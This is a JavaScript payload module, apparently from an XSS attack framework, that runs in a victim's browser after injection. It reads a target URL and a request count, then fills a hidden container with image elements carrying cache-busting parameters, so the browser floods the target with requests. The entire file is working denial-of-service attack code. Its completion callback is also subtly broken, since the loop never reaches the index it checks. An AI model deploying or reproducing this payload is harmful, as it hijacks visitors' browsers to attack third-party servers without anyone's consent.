xssmin();
xss.dbg("DoS start");
// called after the DoS finishes
function xssdosfin() {
	xss.dbg(xss.requests + " DoS complete");
	xss.rm("xssholder");
}


// start the DoS
function xssdos() {
	// get the options
	var url = decodeURIComponent(xss.opt("url", "the url to DoS", "http://localhost"));
	xss.requests = xss.opt("requests", "number of requests to send", "10");

	// create a hidden container for the images
	var holder = xss.ce("div");
	xss.sa(holder, "style", xss.hide);
	xss.id = "xssholder";

	xss.dbg("sending " + xss.requests + " requests to " + url);

	// add an image for each request qith a custom v parameter
	for (var i=0;i<xss.requests;i++) {
		var url2 = url;
		if (url.indexOf("?")>0) { url2 = url + "&v="+i; }
		else { url2 = url + "?v="+i; }
		// the last image has callbacks so we know when the last request is sent
		if (i==xss.requests)
			xss.ci(url2, xss.hide, "xssholder", "xssdosfin()", "xssdosfin()");
		else
			xss.ci(url2, xss.hide, "xssholder", false, false);
	}

	xss.dbg("images added to document");
}

xssdos();
